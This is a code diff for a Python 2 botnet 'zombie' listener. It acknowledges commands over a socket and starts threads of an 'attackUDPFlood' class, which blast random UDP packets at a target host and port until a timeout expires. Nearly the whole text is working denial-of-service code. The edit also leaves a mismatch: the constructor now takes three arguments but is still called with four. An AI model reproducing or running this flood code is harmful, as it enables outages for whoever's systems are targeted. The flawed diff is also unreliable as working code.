@@ -14,35 +14,17 @@ class zombie(SocketServer.BaseRequestHandler):
         self.request.sendall("ACK")
 
         for i in xrange(N):
-            attack = attackModule(timeout, target, port, i)
+            attack = attackUDPFlood(timeout, target, port, i)
             attack.start()
 
-        print "ended attack"
-
-    """
-    def attack(self, timeout, target, port):
-        print "start attack: ", timeout, " ", target, " ", port
-        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        MESSAGE = os.urandom(50000)
-
-        start = time.clock()
-        while time.clock() - start < timeout:
-            #port = random.randint(1, 65535)
-            victim.sendto(MESSAGE, (target, port))
-    """
-
-class attackModule(threading.Thread):
-    def __init__(self, timeout, target, port, num):
+class attackUDPFlood(threading.Thread):
+    def __init__(self, timeout, target, port):
         threading.Thread.__init__(self)
         self.timeout = int(timeout)
         self.target = target
         self.port = int(port)
 
-        # for debugging
-        self.num = num
-
     def run(self):
-        print "entered attack thread ", self.num
         victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         MESSAGE = os.urandom(1024)
 
@@ -50,7 +32,6 @@ class attackModule(threading.Thread):
         while time.time() - start < self.timeout:
             victim.sendto(MESSAGE, (self.target, self.port))
 
-        print "ended attack run"
 
 if __name__ == '__main__':
     HOST = socket.gethostbyname(socket.gethostname())
